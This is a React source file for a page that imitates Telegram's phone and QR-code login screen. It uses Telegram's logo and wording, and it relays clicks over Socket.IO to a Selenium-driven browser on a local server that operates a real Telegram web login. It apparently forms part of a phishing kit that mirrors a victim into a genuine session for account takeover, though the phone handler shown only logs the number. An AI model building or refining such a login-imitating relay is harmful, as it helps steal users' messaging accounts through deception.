import type { FC } from 'react';
import { useState, useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { useNavigate } from 'react-router-dom';

import { Page } from '@/components/Page.tsx';

interface Country {
  code: string;
  name: string;
  flag: string;
  dialCode: string;
}

const countries: Country[] = [
  { code: 'FI', name: 'Finland', flag: '🇫🇮', dialCode: '+358' },
  { code: 'US', name: 'United States', flag: '🇺🇸', dialCode: '+1' },
  { code: 'GB', name: 'United Kingdom', flag: '🇬🇧', dialCode: '+44' },
  { code: 'DE', name: 'Germany', flag: '🇩🇪', dialCode: '+49' },
  { code: 'FR', name: 'France', flag: '🇫🇷', dialCode: '+33' },
  { code: 'IT', name: 'Italy', flag: '🇮🇹', dialCode: '+39' },
  { code: 'ES', name: 'Spain', flag: '🇪🇸', dialCode: '+34' },
  { code: 'CA', name: 'Canada', flag: '🇨🇦', dialCode: '+1' },
  { code: 'AU', name: 'Australia', flag: '🇦🇺', dialCode: '+61' },
  { code: 'JP', name: 'Japan', flag: '🇯🇵', dialCode: '+81' },
  { code: 'CN', name: 'China', flag: '🇨🇳', dialCode: '+86' },
  { code: 'IN', name: 'India', flag: '🇮🇳', dialCode: '+91' },
  { code: 'BR', name: 'Brazil', flag: '🇧🇷', dialCode: '+55' },
  { code: 'RU', name: 'Russia', flag: '🇷🇺', dialCode: '+7' },
  { code: 'KR', name: 'South Korea', flag: '🇰🇷', dialCode: '+82' },
  { code: 'MX', name: 'Mexico', flag: '🇲🇽', dialCode: '+52' },
  { code: 'NL', name: 'Netherlands', flag: '🇳🇱', dialCode: '+31' },
  { code: 'SE', name: 'Sweden', flag: '🇸🇪', dialCode: '+46' },
  { code: 'NO', name: 'Norway', flag: '🇳🇴', dialCode: '+47' },
  { code: 'DK', name: 'Denmark', flag: '🇩🇰', dialCode: '+45' },
];

export const PhoneLoginPage: FC = () => {
  const navigate = useNavigate();
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0]);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
  const [seleniumStatus, setSeleniumStatus] = useState<string>('Checking Selenium...');
  const [qrCodeButtonFound, setQrCodeButtonFound] = useState(false);
  const [isQrCodeButtonLoading, setIsQrCodeButtonLoading] = useState(false);
  
  const socketRef = useRef<Socket | null>(null);
  const sessionIdRef = useRef<string>('');

  // Initialize socket connection and check for QR code button
  useEffect(() => {
    // Get session ID from URL or localStorage
    const urlParams = new URLSearchParams(window.location.search);
    let sessionId = urlParams.get('sessionId');
    
    // If not in URL, try to get from localStorage
    if (!sessionId) {
      sessionId = localStorage.getItem('telegram_session_id') || '';
      console.log('🔍 PhoneLoginPage: Session ID not in URL, trying localStorage:', sessionId);
    }
    
    // If still no session ID, try to get from sessionStorage
    if (!sessionId) {
      sessionId = sessionStorage.getItem('telegram_session_id') || '';
      console.log('🔍 PhoneLoginPage: Session ID not in localStorage, trying sessionStorage:', sessionId);
    }
    
    sessionIdRef.current = sessionId;

    console.log('🔍 PhoneLoginPage: Final session ID:', sessionId);
    console.log('🔍 PhoneLoginPage: URL search params:', window.location.search);

    if (sessionId) {
      console.log('✅ PhoneLoginPage: Session ID found, connecting to Socket.IO...');
      
      // Connect to Socket.IO server
      const socket = io('http://localhost:3000', {
        transports: ['websocket', 'polling']
      });
      
      socketRef.current = socket;

      socket.on('connect', () => {
        console.log('✅ Connected to Socket.IO server from PhoneLoginPage');
        setIsSeleniumReady(true);
        setSeleniumStatus('Selenium connected, checking for QR code button...');
        
        // Check if the QR code button is present in Selenium window
        checkQrCodeButtonInSelenium();
      });

      socket.on('connect_error', (error) => {
        console.error('❌ Socket connection error:', error);
        setSeleniumStatus(`Socket connection error: ${error.message}`);
      });

      socket.on('disconnect', (reason) => {
        console.log('❌ Disconnected from Socket.IO server, reason:', reason);
        setIsSeleniumReady(false);
        setSeleniumStatus(`Selenium disconnected: ${reason}`);
      });

      socket.on('elementCheckResult', (data) => {
        console.log('🔍 Element check result for QR code button:', data);
        if (data.sessionId === sessionId) {
          if (data.elementFound) {
            console.log('✅ QR code button found in Selenium window!');
            setQrCodeButtonFound(true);
            setSeleniumStatus('QR code button ready');
          } else {
            console.log('❌ QR code button not found in Selenium window');
            setQrCodeButtonFound(false);
            setSeleniumStatus('QR code button not found - waiting for page to load...');
            
            // Retry after a delay
            setTimeout(() => {
              if (socketRef.current && socketRef.current.connected) {
                checkQrCodeButtonInSelenium();
              }
            }, 2000);
          }
        }
      });

      // Periodic check for QR code button
      const checkInterval = setInterval(() => {
        if (socketRef.current && socketRef.current.connected && sessionId && !qrCodeButtonFound) {
          console.log('🔄 Periodic check for QR code button...');
          checkQrCodeButtonInSelenium();
        }
      }, 3000);

      // Set a timeout to prevent indefinite waiting
      const timeoutId = setTimeout(() => {
        if (!qrCodeButtonFound) {
          setSeleniumStatus('QR code button timeout - please refresh the page');
          console.warn('⚠️ QR code button timeout reached');
        }
      }, 30000); // 30 seconds timeout

      return () => {
        clearInterval(checkInterval);
        clearTimeout(timeoutId);
        socket.disconnect();
      };
    }
  }, []);

  // Reset loading state when component unmounts
  useEffect(() => {
    return () => {
      setIsQrCodeButtonLoading(false);
    };
  }, []);

  // Function to check if QR code button is present in Selenium window
  const checkQrCodeButtonInSelenium = () => {
    if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
      console.log('🔍 Checking if QR code button is present in Selenium window...');
      socketRef.current.emit('checkElementInSelenium', {
        sessionId: sessionIdRef.current,
        selector: 'div#auth-phone-number-form form button',
        timestamp: new Date().toISOString()
      });
    }
  };

  const handleCountrySelect = (country: Country) => {
    setSelectedCountry(country);
    setShowCountryDropdown(false);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle phone number submission here
    console.log('Phone number submitted:', selectedCountry.dialCode + phoneNumber);
  };

  const goBackToQrCode = () => {
    // Check if QR code button is found in Selenium window
    if (!qrCodeButtonFound) {
      setSeleniumStatus('Please wait for QR code button to be ready...');
      return;
    }

    // Prevent multiple rapid clicks
    if (isQrCodeButtonLoading) {
      return;
    }

    try {
      setIsQrCodeButtonLoading(true);
      setSeleniumStatus('Initiating QR code return...');
      
      // Send message to Selenium server to click the QR code button
      if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
        socketRef.current.emit('clickAuthFormButton', {
          sessionId: sessionIdRef.current,
          selector: 'div#auth-phone-number-form form button',
          timestamp: new Date().toISOString()
        });
        
        console.log('✅ QR code return request sent to Selenium server');
      }
      
      // Navigate back to the main page
      navigate('/');
    } catch (error) {
      console.error('❌ Error in goBackToQrCode:', error);
      setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
      setIsQrCodeButtonLoading(false);
    }
  };

  return (
    <Page back={true}>
      <div style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: '100vh',
        padding: '40px 20px',
        backgroundColor: 'white',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}>
        {/* Login Content Container */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          maxWidth: '400px',
          width: '100%'
        }}>
          {/* Selenium Status Indicator */}
          <div style={{
            marginBottom: '24px',
            padding: '12px 16px',
            backgroundColor: '#f8f9fa',
            border: '1px solid #dee2e6',
            borderRadius: '8px',
            width: '100%',
            textAlign: 'center'
          }}>
            <div style={{
              fontSize: '14px',
              color: '#6c757d',
              marginBottom: '8px'
            }}>
              Selenium Status
            </div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px'
            }}>
              <div style={{
                width: '8px',
                height: '8px',
                borderRadius: '50%',
                backgroundColor: qrCodeButtonFound ? '#28a745' : '#ffc107'
              }} />
              <span style={{
                fontSize: '12px',
                color: qrCodeButtonFound ? '#155724' : '#856404',
                fontWeight: '500'
              }}>
                {qrCodeButtonFound ? 'QR Code Button Ready' : 'QR Code Button Loading...'}
              </span>
            </div>
            {!qrCodeButtonFound && (
              <div style={{
                fontSize: '11px',
                color: '#6c757d',
                marginTop: '4px'
              }}>
                {seleniumStatus}
              </div>
            )}
            {!qrCodeButtonFound && !seleniumStatus.includes('timeout') && (
              <button
                onClick={() => {
                  setSeleniumStatus('Manually checking QR code button...');
                  checkQrCodeButtonInSelenium();
                }}
                style={{
                  marginTop: '8px',
                  padding: '4px 12px',
                  fontSize: '11px',
                  backgroundColor: '#6c757d',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Check QR Code Button
              </button>
            )}
          </div>

          {/* Debug Information (only show in development) */}
          {import.meta.env.DEV && (
            <div style={{
              marginBottom: '16px',
              padding: '8px 12px',
              backgroundColor: '#f8f9fa',
              border: '1px solid #dee2e6',
              borderRadius: '4px',
              fontSize: '11px',
              color: '#6c757d'
            }}>
              <div style={{ fontWeight: '500', marginBottom: '4px' }}>Debug Info:</div>
              <div>Socket: {isSeleniumReady ? '✅ Connected' : '❌ Disconnected'}</div>
              <div>Session: {sessionIdRef.current || 'None'}</div>
              <div>QR Button: {qrCodeButtonFound ? '✅ Found' : '⏳ Waiting'}</div>
              <div>Status: {seleniumStatus}</div>
              {!sessionIdRef.current && (
                <button
                  onClick={() => {
                    // Try to get session ID from various sources
                    const urlParams = new URLSearchParams(window.location.search);
                    let sessionId = urlParams.get('sessionId') || localStorage.getItem('telegram_session_id') || sessionStorage.getItem('telegram_session_id') || '';
                    sessionIdRef.current = sessionId;
                    if (sessionId) {
                      setSeleniumStatus('Retrying connection...');
                      // Force a reconnection
                      if (socketRef.current) {
                        socketRef.current.disconnect();
                      }
                      // Re-run the effect
                      window.location.reload();
                    } else {
                      setSeleniumStatus('No session ID found - please go back to main page');
                    }
                  }}
                  style={{
                    marginTop: '8px',
                    padding: '4px 12px',
                    fontSize: '11px',
                    backgroundColor: '#dc3545',
                    color: 'white',
                    border: 'none',
                    borderRadius: '4px',
                    cursor: 'pointer'
                  }}
                >
                  Retry Connection
                </button>
              )}
            </div>
          )}

          {/* Telegram Logo */}
          <div style={{
            marginBottom: '32px',
            textAlign: 'center'
          }}>
            <img 
              src="/reactjs-template/telegram-logo.svg" 
              alt="Telegram" 
              style={{
                width: '160px',
                height: '160px',
                marginBottom: '16px'
              }}
            />
            <h1 style={{
              fontSize: '24px',
              color: '#000',
              margin: '0',
              fontWeight: '600',
              letterSpacing: '-0.02em'
            }}>
              Telegram
            </h1>
          </div>

          {/* Instructions */}
          <p style={{
            fontSize: '16px',
            color: '#666',
            textAlign: 'center',
            margin: '0 0 32px 0',
            lineHeight: '1.4',
            maxWidth: '360px'
          }}>
            Please confirm your country code and enter your phone number.
          </p>

          {/* Phone Number Form */}
          <form onSubmit={handleSubmit} style={{
            width: '100%',
            maxWidth: '360px'
          }}>
            {/* Country Selection */}
            <div style={{
              marginBottom: '20px',
              position: 'relative'
            }}>
              <div 
                onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                style={{
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  padding: '0 16px',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  backgroundColor: 'white',
                  transition: 'border-color 0.2s',
                  height: '48px',
                  boxSizing: 'border-box',
                  position: 'relative'
                }}
              >
                <label style={{
                  position: 'absolute',
                  top: '-8px',
                  left: '12px',
                  fontSize: '14px',
                  color: '#666',
                  backgroundColor: 'white',
                  padding: '0 4px',
                  fontWeight: '500'
                }}>
                  Country
                </label>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  marginTop: '8px'
                }}>
                  <span style={{ fontSize: '20px' }}>{selectedCountry.flag}</span>
                  <span style={{ fontSize: '16px', color: '#333' }}>{selectedCountry.name}</span>
                </div>
                <svg 
                  width="16" 
                  height="16" 
                  viewBox="0 0 24 24" 
                  fill="none"
                  style={{
                    transform: showCountryDropdown ? 'rotate(180deg)' : 'rotate(0deg)',
                    transition: 'transform 0.2s',
                    marginTop: '8px'
                  }}
                >
                  <path d="M7 10l5 5 5-5" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>

              {/* Country Dropdown */}
              {showCountryDropdown && (
                <div style={{
                  position: 'absolute',
                  top: '100%',
                  left: 0,
                  right: 0,
                  backgroundColor: 'white',
                  border: '1px solid #e1e8ed',
                  borderRadius: '8px',
                  maxHeight: '200px',
                  overflowY: 'auto',
                  zIndex: 1000,
                  boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
                }}>
                  {countries.map((country) => (
                    <div
                      key={country.code}
                      onClick={() => handleCountrySelect(country)}
                      style={{
                        padding: '12px 16px',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'space-between',
                        borderBottom: '1px solid #f0f0f0',
                        transition: 'background-color 0.2s'
                      }}
                      onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f8f9fa'}
                      onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'white'}
                    >
                      <div style={{
                        display: 'flex',
                        alignItems: 'center',
                        gap: '12px'
                      }}>
                        <span style={{ fontSize: '18px' }}>{country.flag}</span>
                        <span style={{ fontSize: '16px', color: '#333' }}>{country.name}</span>
                      </div>
                      <span style={{ fontSize: '14px', color: '#666' }}>{country.dialCode}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Phone Number Input */}
            <div style={{
              marginBottom: '24px'
            }}>
              <div style={{
                display: 'flex',
                border: '1px solid #e1e8ed',
                borderRadius: '8px',
                overflow: 'visible',
                height: '48px',
                boxSizing: 'border-box',
                position: 'relative'
              }}>
                <label style={{
                  position: 'absolute',
                  top: '-8px',
                  left: '12px',
                  fontSize: '14px',
                  color: '#666',
                  backgroundColor: 'white',
                  padding: '0 4px',
                  fontWeight: '500',
                  zIndex: 1
                }}>
                  Your phone number
                </label>
                <div style={{
                  padding: '0 16px',
                  display: 'flex',
                  alignItems: 'center',
                  fontSize: '16px',
                  color: '#333',
                  fontWeight: '500',
                  height: '48px',
                  boxSizing: 'border-box'
                }}>
                  {selectedCountry.dialCode}
                </div>
                <input
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  placeholder="Enter phone number"
                  style={{
                    flex: 1,
                    padding: '0 16px',
                    border: 'none',
                    outline: 'none',
                    fontSize: '16px',
                    color: '#333',
                    boxSizing: 'border-box',
                    borderRadius: '8px'
                  }}
                />
              </div>
            </div>

            {/* Keep Signed In Checkbox */}
            <div style={{
              marginBottom: '32px',
              display: 'flex',
              alignItems: 'center',
              gap: '12px'
            }}>
              <input
                type="checkbox"
                id="keepSignedIn"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                style={{
                  width: '18px',
                  height: '18px',
                  accentColor: '#0088cc'
                }}
              />
              <label 
                htmlFor="keepSignedIn"
                style={{
                  fontSize: '16px',
                  color: '#333',
                  cursor: 'pointer'
                }}
              >
                Keep me signed in
              </label>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              style={{
                width: '100%',
                padding: '14px 24px',
                backgroundColor: '#0088cc',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: 'pointer',
                transition: 'background-color 0.2s'
              }}
              onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#0077b3'}
              onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#0088cc'}
            >
              Continue
            </button>
          </form>

          {/* QR Code Login Link */}
          <div style={{
            marginTop: '32px',
            textAlign: 'center'
          }}>
            <button
              onClick={goBackToQrCode}
              disabled={!qrCodeButtonFound || isQrCodeButtonLoading}
              style={{
                background: qrCodeButtonFound && !isQrCodeButtonLoading ? 'none' : '#f5f5f5',
                border: 'none',
                color: qrCodeButtonFound && !isQrCodeButtonLoading ? '#0088cc' : '#999',
                fontSize: '16px',
                cursor: qrCodeButtonFound && !isQrCodeButtonLoading ? 'pointer' : 'not-allowed',
                textDecoration: 'none',
                padding: '8px 16px',
                borderRadius: '4px',
                transition: 'background-color 0.2s',
                opacity: qrCodeButtonFound && !isQrCodeButtonLoading ? 1 : 0.6
              }}
              onMouseOver={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = '#f0f8ff';
                }
              }}
              onMouseOut={(e) => {
                if (qrCodeButtonFound && !isQrCodeButtonLoading) {
                  e.currentTarget.style.backgroundColor = 'transparent';
                }
              }}
            >
              {isQrCodeButtonLoading ? 'Returning...' : 
               qrCodeButtonFound ? 'LOG IN BY QR CODE' : 'WAITING FOR QR CODE BUTTON...'}
            </button>
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginTop: '8px',
              textAlign: 'center'
            }}>
              {seleniumStatus}
            </p>
          </div>
        </div>
      </div>
    </Page>
  );
}; 